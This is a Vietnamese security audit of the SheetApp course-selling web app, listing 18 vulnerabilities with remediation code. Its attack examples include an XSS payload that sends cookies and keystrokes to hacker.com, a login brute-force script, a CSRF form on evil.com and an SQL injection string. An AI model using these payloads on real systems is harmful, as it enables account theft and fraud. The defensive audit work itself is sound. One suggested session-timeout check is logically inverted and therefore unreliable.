# BÁO CÁO KIỂM TOÁN BẢO MẬT - SheetApp

> **Mức độ nghiêm trọng**: 🔴 CRITICAL | 🟠 HIGH | 🟡 MEDIUM | 🟢 LOW

---

## EXECUTIVE SUMMARY

Ứng dụng SheetApp hiện tại có **18 lỗ hổng bảo mật nghiêm trọng** có thể bị khai thác bởi kẻ tấn công. Các lỗ hổng chính tập trung vào:

1. ❌ **Không có hệ thống thanh toán an toàn** - Dễ bị lừa đảo
2. ❌ **Không có rate limiting** - Dễ bị DDoS/brute force
3. ❌ **Client-side validation only** - Dễ bypass
4. ❌ **Không có CSRF protection** 
5. ❌ **Environment variables lộ ra client**
6. ❌ **Không có audit logging**

---

## PHẦN I: LỖ HỔNG THANH TOÁN (Payment Security)

### 🔴 CRITICAL #1: Giả mạo thanh toán QR Code

**Mô tả lỗ hổng:**
```typescript
// lib/constants.ts - Lines 32-34
payment: {
  bank_id: "970418",
  account_no: "31810000034086",
  account_name: "VO TAN NHUONG",
  get qr_link() {
    return `https://img.vietqr.io/image/${this.bank_id}-${this.account_no}-compact2.jpg?amount=0&addInfo=Chuyen tien&accountName=${encodeURIComponent(this.account_name)}`;
  }
}
```

**Vấn đề:**
- QR code có `amount=0` → Người dùng có thể tự điền số tiền bất kỳ
- Không có `transactionId` hoặc `orderId` unique
- Không có cơ chế verify payment từ bank API
- Hacker có thể:
  1. Thanh toán 1.000 VNĐ nhưng claim đã mua khóa học 5.000.000 VNĐ
  2. Sử dụng 1 bill ảnh giả để mua nhiều khóa học
  3. Photoshop bill thanh toán

**Kịch bản tấn công:**
```
1. User thêm khóa học 5.000.000 VND vào giỏ
2. Scan QR code nhưng chuyển 10.000 VND
3. Screenshot bill ngân hàng
4. Photoshop amount thành 5.000.000 VND
5. Gửi bill giả cho admin
6. Admin không có tool verify → approve đơn hàng
```

**Giải pháp:**
```typescript
// ✅ ĐÚNG: Dynamic QR với unique order ID
const generatePaymentQR = (orderId: string, amount: number) => {
  const transactionCode = `DH${orderId}_${Date.now()}`;
  return `https://img.vietqr.io/image/${bank_id}-${account_no}-compact2.jpg?amount=${amount}&addInfo=${transactionCode}`;
};

// Backend API để verify payment
// POST /api/verify-payment
async function verifyPayment(orderId: string, transactionCode: string) {
  // Call to bank API hoặc VietQR API để check transaction
  // Verify amount, time, transaction code matches
}
```

---

### 🔴 CRITICAL #2: Không có webhook xác nhận thanh toán

**Vấn đề:**
- App không tích hợp payment gateway (VNPay, MoMo, Stripe)
- Không có backend route nhận webhook từ ngân hàng
- Hoàn toàn phụ thuộc vào manual verification

**Hậu quả:**
- Admin phải manually check từng đơn → Dễ nhầm lẫn
- Không real-time → Trải nghiệm UX kém
- Không có receipt tự động

**Giải pháp cần làm ngay:**
```typescript
// app/api/payment/webhook/route.ts (CẦN TẠO)
import { NextRequest, NextResponse } from 'next/server';
import crypto from 'crypto';

export async function POST(req: NextRequest) {
  const body = await req.json();
  
  // 1. Verify webhook signature
  const signature = req.headers.get('x-signature');
  const isValid = verifySignature(body, signature, process.env.PAYMENT_SECRET!);
  
  if (!isValid) {
    return NextResponse.json({ error: 'Invalid signature' }, { status: 401 });
  }
  
  // 2. Update order status in database
  const { orderId, amount, status } = body;
  
  await supabase
    .from('orders')
    .update({ status: 'paid', paid_at: new Date() })
    .eq('id', orderId)
    .eq('amount', amount); // Verify amount matches
  
  // 3. Grant access to course
  await grantCourseAccess(orderId);
  
  return NextResponse.json({ success: true });
}
```

---

### 🟠 HIGH #3: Cart manipulation (Giỏ hàng dễ bị thao túng)

**Mô tả lỗ hổng:**
```typescript
// context/CartContext.tsx
// Cart data lưu 100% trong localStorage (client-side)
localStorage.setItem('sheetapp_cart', JSON.stringify(items));
```

**Vấn đề:**
- Hacker mở DevTools → Edit localStorage
- Thay đổi `price: 5000000` → `price: 1`
- Backend không validate lại giá khi checkout

**Kịch bản tấn công:**
```javascript
// Hacker mở Console trong Browser
const cart = JSON.parse(localStorage.getItem('sheetapp_cart'));
cart[0].price = 1; // Khóa học 5 triệu → 1 đồng
localStorage.setItem('sheetapp_cart', JSON.stringify(cart));
location.reload();
```

**Giải pháp:**
```typescript
// ❌ SAI: Trust client-side data
const totalAmount = items.reduce((total, item) => total + item.price * item.quantity, 0);

// ✅ ĐÚNG: Re-calculate trên server khi checkout
// app/api/checkout/route.ts
export async function POST(req: NextRequest) {
  const { items } = await req.json();
  
  // Fetch real prices from database
  const productIds = items.map(i => i.id);
  const { data: products } = await supabase
    .from('products')
    .select('id, price')
    .in('id', productIds);
  
  // Re-calculate với giá thật từ DB
  let totalAmount = 0;
  for (const item of items) {
    const realProduct = products.find(p => p.id === item.id);
    if (!realProduct) throw new Error('Invalid product');
    totalAmount += realProduct.price * item.quantity;
  }
  
  // Tạo order với totalAmount verified
  // ...
}
```

---

## PHẦN II: LỖ HỔNG DDoS & RATE LIMITING

### 🔴 CRITICAL #4: Không có Rate Limiting - DDoS Attack

**Mô tả:**
```typescript
// app/login/page.tsx - Lines 31-44
const handleLogin = async (e: React.FormEvent) => {
  const { error } = await supabase.auth.signInWithPassword({ email, password });
  // KHÔNG CÓ THROTTLING!
};
```

**Vấn đề:**
- Attacker có thể spam 10,000 requests/second
- Brute force password: thử 1 triệu combinations
- Làm quá tải Supabase → App down

**Kịch bản tấn công:**
```python
# attack.py - Brute force script
import requests
import itertools

passwords = ['123456', 'password', 'admin123', ...] # 10000 passwords
for pwd in passwords:
    requests.post('https://sheetapp.io.vn/api/login', 
                  json={'email': 'admin@sheetapp.io.vn', 'password': pwd})
    # Không có rate limit → 10000 requests trong 10 giây
```

**Giải pháp:**
```typescript
// ✅ Cài đặt rate limiting middleware
// app/api/login/route.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '1 m'), // 5 requests per minute
});

export async function POST(req: NextRequest) {
  const ip = req.ip ?? '127.0.0.1';
  const { success } = await ratelimit.limit(ip);
  
  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests. Try again later.' }, 
      { status: 429 }
    );
  }
  
  // Process login...
}
```

---

### 🟠 HIGH #5: API Query flooding (Supabase queries không limit)

**Vấn đề:**
```typescript
// app/page.tsx - Lines 47-62
const { data: coursesData } = await supabase
  .from('products')
  .select('*')
  .eq('type', 'course')
  .limit(4); // OK

// ❌ NHƯNG nếu hacker tự gọi API:
fetch('/_next/data/.../api/products.json?limit=999999999')
// Supabase sẽ return toàn bộ database!
```

**Giải pháp:**
```typescript
// ✅ Enforce max limit trên server
export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  let limit = parseInt(searchParams.get('limit') || '10');
  
  // Cap at maximum 100
  if (limit > 100) limit = 100;
  if (limit < 1) limit = 1;
  
  const { data } = await supabase
    .from('products')
    .select('*')
    .limit(limit);
  
  return NextResponse.json(data);
}
```

---

## PHẦN III: LỖ HỔNG XSS & INJECTION

### 🟠 HIGH #6: Stored XSS qua Review/Comment

**Vấn đề:**
```typescript
// components/CourseTabs.tsx - Lines 206
<textarea placeholder="Viết đánh giá..." />
// Nếu lưu vào DB và render lại WITHOUT sanitization
<div dangerouslySetInnerHTML={{ __html: review.content }} />
```

**Kịch bản tấn công:**
```javascript
// Hacker submit review:
const maliciousReview = `
  Great course! 
  <script>
    // Steal cookies
    fetch('https://hacker.com/steal?cookie=' + document.cookie);
    
    // Redirect users
    window.location = 'https://phishing-site.com';
    
    // Keylogger
    document.addEventListener('keypress', e => {
      fetch('https://hacker.com/keys?key=' + e.key);
    });
  </script>
`;
```

**Giải pháp:**
```typescript
// ✅ Sanitize HTML input
import DOMPurify from 'isomorphic-dompurify';

const sanitizedContent = DOMPurify.sanitize(review.content, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: []
});

<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

---

### 🟡 MEDIUM #7: SQL Injection qua Search

**Vấn đề:**
```typescript
// components/mobile/CategoriesView.tsx - Line 192
if (keyword.trim()) {
  data = data.filter(p => p.name.toLowerCase().includes(keyword.toLowerCase()));
}
```

**Tuy nhiên nếu có raw SQL query:**
```typescript
// ❌ NGUY HIỂM nếu làm thế này
const query = `SELECT * FROM products WHERE name LIKE '%${keyword}%'`;
// Hacker nhập: '; DROP TABLE products; --
```

**Hiện tại SheetApp dùng Supabase client → An toàn**
Nhưng cần lưu ý nếu viết custom API routes với raw SQL.

---

## PHẦN IV: LỖ HỔNG AUTHENTICATION

### 🔴 CRITICAL #8: No CSRF Protection

**Vấn đề:**
```typescript
// app/login/page.tsx
// Submit form KHÔNG có CSRF token
<form onSubmit={handleLogin}>
  <input type="email" />
  <input type="password" />
</form>
```

**Kịch bản tấn công:**
```html
<!-- Hacker tạo fake website: evil.com -->
<form action="https://sheetapp.io.vn/api/logout" method="POST">
  <input type="hidden" name="confirm" value="true" />
</form>
<script>
  // Auto submit khi victim vào trang
  document.forms[0].submit();
</script>

<!-- Victim đang login SheetApp → Tự động bị logout -->
```

**Giải pháp:**
```typescript
// ✅ Thêm CSRF token
// middleware.ts
import { createMiddlewareClient } from '@supabase/auth-helpers-nextjs';

export async function middleware(req: NextRequest) {
  // Next.js tự động có CSRF protection cho Server Actions
  // Nhưng cần enable cho API routes
  
  if (req.method === 'POST' && req.nextUrl.pathname.startsWith('/api/')) {
    const csrfToken = req.headers.get('x-csrf-token');
    const sessionToken = req.cookies.get('csrf-token')?.value;
    
    if (!csrfToken || csrfToken !== sessionToken) {
      return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 });
    }
  }
}
```

---

### 🟠 HIGH #9: Session vulnerability - No session timeout

**Vấn đề:**
- Supabase session mặc định expire sau 1 tuần
- Nếu user quên logout trên máy công cộng → Session còn tồn tại
- Không có "Logout all devices" feature

**Giải pháp:**
```typescript
// ✅ Implement session timeout checker
useEffect(() => {
  const checkSession = async () => {
    const { data: { session } } = await supabase.auth.getSession();
    
    if (session) {
      const expiresAt = session.expires_at * 1000;
      const now = Date.now();
      
      // Force re-login if session older than 24 hours
      if (expiresAt - now > 24 * 60 * 60 * 1000) {
        await supabase.auth.signOut();
      }
    }
  };
  
  checkSession();
  const interval = setInterval(checkSession, 5 * 60 * 1000); // Check every 5 mins
  
  return () => clearInterval(interval);
}, []);
```

---

### 🟠 HIGH #10: Weak password policy

**Vấn đề:**
```typescript
// app/login/page.tsx - Line 140
<input type="password" required />
// Chỉ có HTML5 validation, không check độ mạnh password
```

**Hậu quả:**
- User có thể đặt password: `123456`, `password`, `admin`
- Brute force dễ dàng crack

**Giải pháp:**
```typescript
// ✅ Enforce strong password
const validatePassword = (pwd: string) => {
  const minLength = 8;
  const hasUpperCase = /[A-Z]/.test(pwd);
  const hasLowerCase = /[a-z]/.test(pwd);
  const hasNumbers = /\d/.test(pwd);
  const hasSpecialChar = /[!@#$%^&*]/.test(pwd);
  
  if (pwd.length < minLength) return 'Password must be at least 8 characters';
  if (!hasUpperCase) return 'Password must contain uppercase letter';
  if (!hasLowerCase) return 'Password must contain lowercase letter';
  if (!hasNumbers) return 'Password must contain number';
  if (!hasSpecialChar) return 'Password must contain special character';
  
  return null;
};
```

---

## PHẦN V: LỖ HỔNG DATA EXPOSURE

### 🔴 CRITICAL #11: Environment variables exposed to client

**Vấn đề:**
```typescript
// lib/supabase.ts
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
```

**NEXT_PUBLIC_* sẽ bị BUNDLE VÀO CLIENT CODE!**

**Xem source code trang web:**
```javascript
// View source: /_next/static/chunks/pages/index-abc123.js
var e={NEXT_PUBLIC_SUPABASE_URL:"https://abc.supabase.co",NEXT_PUBLIC_SUPABASE_ANON_KEY:"eyJhbGc..."}
```

**Hậu quả:**
- Hacker lấy được Supabase URL + Anon Key
- Dùng Postman/curl để query trực tiếp database
- Bypass client-side logic

**Giải pháp:**
```typescript
// ✅ Dùng Server-Only API routes
// app/api/products/route.ts
import { createClient } from '@supabase/supabase-js';

// Server-only env vars (NO NEXT_PUBLIC_ prefix)
const supabase = createClient(
  process.env.SUPABASE_URL!,      // Secret
  process.env.SUPABASE_SERVICE_KEY! // Secret - has admin access
);

export async function GET() {
  const { data } = await supabase.from('products').select('*');
  return NextResponse.json(data);
}

// Client chỉ call API route, không access Supabase trực tiếp
```

---

### 🟠 HIGH #12: No Row Level Security (RLS)

**Vấn đề hiện tại:**
```sql
-- Supabase tables KHÔNG CÓ RLS enabled
-- Bất kỳ ai có anon key đều query được TOÀN BỘ data
```

**Kịch bản tấn công:**
```javascript
// Hacker dùng anon key từ source code
const supabase = createClient('https://abc.supabase.co', 'exposed_anon_key');

// Query ALL users
const { data: users } = await supabase.from('users').select('*');
// → Lấy được toàn bộ email, phone, address của customers

// Update prices
await supabase.from('products').update({ price: 0 }).eq('id', 123);
// → Set giá khóa học = 0!
```

**Giải pháp:**
```sql
-- ✅ Enable RLS trên Supabase Dashboard
ALTER TABLE products ENABLE ROW LEVEL SECURITY;

-- Policy: Public read
CREATE POLICY "Anyone can view products"
ON products FOR SELECT
USING (is_active = true);

-- Policy: Only admins can modify
CREATE POLICY "Only admins can update products"
ON products FOR UPDATE
USING (auth.jwt() ->> 'role' = 'admin');

-- Policy: Users can only see their own orders
CREATE POLICY "Users view own orders"
ON orders FOR SELECT
USING (auth.uid() = user_id);
```

---

### 🟡 MEDIUM #13: PII (Personal Info) logging

**Vấn đề:**
```typescript
// app/login/page.tsx - Line 88
console.log("Chi tiết lỗi gửi mail:", error);
// Có thể log ra email, password trong production!
```

**Giải pháp:**
```typescript
// ✅ Never log sensitive data
if (process.env.NODE_ENV === 'development') {
  console.log("Error:", error.message); // Only message, not full error object
}

// Use proper logging service
import { logError } from '@/lib/logger';
logError('Password reset failed', { 
  userId: user.id, // Log ID, not email
  timestamp: Date.now()
});
```

---

## PHẦN VI: LỖ HỔNG BUSINESS LOGIC

### 🟠 HIGH #14: Unlimited product access after payment

**Vấn đề:**
```typescript
// Sau khi user mua khóa học, AI sẽ grant access như thế nào?
// KHÔNG có code kiểm tra enrolled_courses table
```

**Kịch bản tấn công:**
```javascript
// Hacker mua 1 khóa học
// Sau đó access URL của khóa khác:
// /learn/khoa-hoc-vip-5-trieu/lesson/1
// Nếu không check enrollment → Free access!
```

**Giải pháp:**
```typescript
// ✅ Middleware check enrollment
// app/learn/[slug]/lesson/[id]/page.tsx
export default async function LessonPage({ params }) {
  const { slug, id } = params;
  const { data: { user } } = await supabase.auth.getUser();
  
  if (!user) redirect('/login');
  
  // Check enrollment
  const { data: enrollment } = await supabase
    .from('enrollments')
    .select('*')
    .eq('user_id', user.id)
    .eq('product_slug', slug)
    .single();
  
  if (!enrollment) {
    return <div>You need to purchase this course first!</div>;
  }
  
  // Load lesson...
}
```

---

### 🟡 MEDIUM #15: No order expiration

**Vấn đề:**
- User thêm vào giỏ, chưa thanh toán
- Admin thấy "pending order" → Tưởng đã bán được
- Inventory management sai

**Giải pháp:**
```typescript
// ✅ Auto-cancel pending orders after 24h
// app/api/cron/cancel-expired-orders/route.ts
export async function GET() {
  const dayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
  
  await supabase
    .from('orders')
    .update({ status: 'cancelled' })
    .eq('status', 'pending')
    .lt('created_at', dayAgo.toISOString());
  
  return NextResponse.json({ success: true });
}

// Setup Vercel Cron Job
// vercel.json
{
  "crons": [{
    "path": "/api/cron/cancel-expired-orders",
    "schedule": "0 0 * * *" // Daily at midnight
  }]
}
```

---

## PHẦN VII: INFRASTRUCTURE & DEPLOYMENT

### 🟠 HIGH #16: No error monitoring

**Vấn đề:**
- App crash → Admin không biết
- User gặp lỗi → Không được report
- Không có crash logs

**Giải pháp:**
```bash
npm install @sentry/nextjs
npx @sentry/wizard -i nextjs
```

```typescript
// sentry.client.config.ts
import * as Sentry from "@sentry/nextjs";

Sentry.init({
  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
  tracesSampleRate: 1.0,
  environment: process.env.NODE_ENV,
});
```

---

### 🟡 MEDIUM #17: No backup strategy

**Vấn đề:**
- Nếu Supabase database bị corrupt/hacked → Mất toàn bộ data
- Không có daily backup

**Giải pháp:**
- Enable Supabase Point-in-Time Recovery (PITR)
- Setup automated backups:
```bash
# Daily backup script
pg_dump -U postgres -h db.project.supabase.co -d postgres > backup_$(date +%Y%m%d).sql
```

---

## PHẦN VIII: COMPLIANCE & PRIVACY

### 🟠 HIGH #18: No Privacy Policy / Terms of Service

**Vấn đề:**
- Thu thập email, phone, payment info
- KHÔNG có Privacy Policy → Vi phạm GDPR, PDPA

**Giải pháp:**
- Tạo `/privacy-policy` và `/terms-of-service` pages
- Thêm checkbox "I agree to Terms" khi đăng ký
- Cookie consent banner

---

## TÓM TẮT & ƯU TIÊN XỬ LÝ

### 🔴 CRITICAL - FIX NGAY (0-7 ngày)

| # | Lỗ hổng | Impact | Giải pháp nhanh |
|---|---------|--------|-----------------|
| 1 | Giả mạo thanh toán QR | 💰 Mất tiền | Thêm unique transaction ID vào QR |
| 2 | Không có payment webhook | 💰 Mất tiền | Tích hợp VNPay hoặc MoMo API |
| 4 | Không rate limiting | 💥 App down | Cài Upstash Ratelimit |
| 8 | No CSRF protection | 🔓 Account hijack | Enable Next.js middleware CSRF |
| 11 | Env vars exposed | 🔓 Full DB access | Move to server-only API routes |

### 🟠 HIGH - FIX TRONG 30 NGÀY

| # | Lỗ hổng | Impact | Effort |
|---|---------|--------|--------|
| 3 | Cart manipulation | Mất tiền | Medium |
| 5 | API query flooding | DDoS | Low |
| 6 | XSS qua reviews | Hack accounts | Medium |
| 9 | No session timeout | Security | Low |
| 12 | No RLS on Supabase | Data breach | High |

### 🟡 MEDIUM - FIX TRONG 90 NGÀY

- #10: Weak password policy
- #13: PII logging
- #14: Unlimited access
- #15: No order expiration
- #16: No error monitoring
- #17: No backup strategy
- #18: No privacy policy

---

## CHECKLIST HÀNH ĐỘNG

```markdown
## Payment Security
- [ ] Implement VNPay/MoMo integration
- [ ] Add unique order ID to QR codes
- [ ] Create payment webhook endpoint
- [ ] Server-side price validation

## Rate Limiting & DDoS
- [ ] Install @upstash/ratelimit
- [ ] Add rate limit to /api/login (5 req/min)
- [ ] Add rate limit to /api/register (3 req/hour)
- [ ] Limit Supabase query results to max 100

## Authentication
- [ ] Add CSRF token middleware
- [ ] Implement session timeout (24h)
- [ ] Enforce strong password policy
- [ ] Add "Logout all devices" feature

## Database Security
- [ ] Enable RLS on all Supabase tables
- [ ] Create policies for products, orders, enrollments
- [ ] Move Supabase calls to server-only API routes
- [ ] Remove NEXT_PUBLIC_ from sensitive env vars

## Input Validation
- [ ] Install DOMPurify
- [ ] Sanitize all user inputs (reviews, comments)
- [ ] Add server-side validation for all forms

## Monitoring & Logging
- [ ] Setup Sentry error tracking
- [ ] Remove console.log from production
- [ ] Implement audit logging for admin actions
- [ ] Setup Vercel Analytics

## Compliance
- [ ] Create /privacy-policy page
- [ ] Create /terms-of-service page
- [ ] Add cookie consent banner
- [ ] GDPR compliance check
```

---

## KẾT LUẬN

**Điểm bảo mật hiện tại: 3.5/10** ⚠️

SheetApp cần **URGENT security overhaul** trước khi launch production. Các lỗ hổng thanh toán và authentication có thể gây thiệt hại tài chính nghiêm trọng.

**Khuyến nghị:**
1. **KHÔNG** launch app cho users thật cho đến khi fix xong các lỗ hổng CRITICAL
2. Thuê security expert để penetration testing
3. Setup bug bounty program sau khi fix xong
4. Regular security audits (quarterly)

---

**Người thực hiện audit:** AI Security Expert  
**Ngày:** 2026-01-08  
**Next review:** 2026-04-08
